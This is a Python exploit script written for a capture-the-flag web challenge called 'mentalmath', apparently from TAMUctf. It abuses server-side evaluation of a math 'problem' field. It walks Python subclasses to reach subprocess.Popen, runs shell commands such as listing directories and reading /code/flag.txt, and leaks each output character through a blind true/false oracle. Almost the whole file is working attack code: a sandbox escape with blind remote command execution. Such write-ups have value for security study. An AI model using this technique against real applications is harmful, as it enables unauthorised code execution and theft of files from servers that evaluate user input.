#!/usr/bin/python

import requests
import string
import time
import _thread

debug = True

target_url = "http://mentalmath.tamuctf.com/ajax/new_problem"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
   "X-Requested-With": "XMLHttpRequest",
   "Accept-Encoding": "gzip, deflate, br",
   "Origin": "http://mentalmath.tamuctf.com",
   "Referer": "http://mentalmath.tamuctf.com/play/",
}


def log_debug(scope, message):
    if debug:
        print("   DEBUG ({}) | {}".format(scope, message))


def check_python_class(searched_class, mro_index, subclass_index):
    #log_debug(searched_class, "search python class > {} in mro={}, subclass={}".format(searched_class, mro_index, subclass_index))
    
    output = ""
    found_chars = 0
    char_index = 8
    for c in searched_class:
        data = {"problem": "ord(list(str(''.__class__.mro()[{}].__subclasses__()[{}]))[{}])".format(mro_index, subclass_index, char_index), "answer": "{}".format(ord(c))}
        #log_debug(searched_class, data)
        
        response = None
        response_ok = False
        while not response_ok:
            try:
                r = requests.post(target_url, headers=headers, data=data)
                response = r.text
                #log_debug(searched_class, response)
                if r.status_code != 502:
                    response_ok = True
                else:
                    time.sleep(10)
            except:
                print("   EXCEPTION!")
                time.sleep(5 * 60)
        
        if "\"correct\": true" in response:
            output += c
            #log_debug(searched_class, output)
            found_chars += 1
            char_index += 1
        elif "\"correct\": false" in response or "Server Error" in response:
            break
        time.sleep(0.5)
    
    if found_chars == len(searched_class):
        print("search python class > {} @ ''.__class__.mro()[{}].__subclasses__()[{}]".format(searched_class, mro_index, subclass_index))


def search_python_class_t(searched_class, mro_index):
    for subclass_index in range(0, 672):
        check_python_class(searched_class, mro_index, subclass_index)


def search_python_class(searched_class):
    print("search python class > {}".format(searched_class))
    for mro_index in range(0, 3):        
        _thread.start_new_thread(search_python_class_t, (searched_class, mro_index,))


def launch_remote_stuff(command_skeleton, command):
    output = ""
    print("remote command > {}".format(command))
    
    finished = False
    index = 0
    while not finished:
        
        for c in string.printable:
            data = {"problem": command_skeleton.format(command, index), "answer": "{}".format(ord(c))}
            #log_debug(command, data)
            
            response = None
            response_ok = False
            while not response_ok:
                try:
                    r = requests.post(target_url, headers=headers, data=data)
                    response = r.text
                    #log_debug(command, response)
                    if r.status_code != 502:
                        response_ok = True
                    else:
                        time.sleep(10)
                except:
                    print("   EXCEPTION!")
                    time.sleep(5 * 60)
            
            if "\"correct\": true" in response:
                output += c
                log_debug(command, output)
                index += 1
                break
            elif "Server Error" in response:
                finished = True
                break
            time.sleep(0.5)
    
    print("[{}] > {}".format(command, output))


def launch_remote_python_command(python_command):
    launch_remote_stuff("ord(list(str({}))[{}])", python_command)


def launch_remote_shell_command(shell_command):
    launch_remote_stuff("ord(list(str(''.__class__.mro()[1].__subclasses__()[208]('{}',shell=True,stdout=-1).communicate()[0].strip()))[{}])", shell_command)


# Exploitation.

#search_python_class("subprocess.Popen") # subprocess.Popen @ ''.__class__.mro()[1].__subclasses__()[208]

#while True:
#    pass

#commands = ["ls /", "ls .", "ls /etc", "ls /code", "ls /dev"]
#for command in commands:
#    _thread.start_new_thread(launch_remote_shell_command, (command,))

#while True:
#    pass

launch_remote_shell_command("cat /code/flag.txt")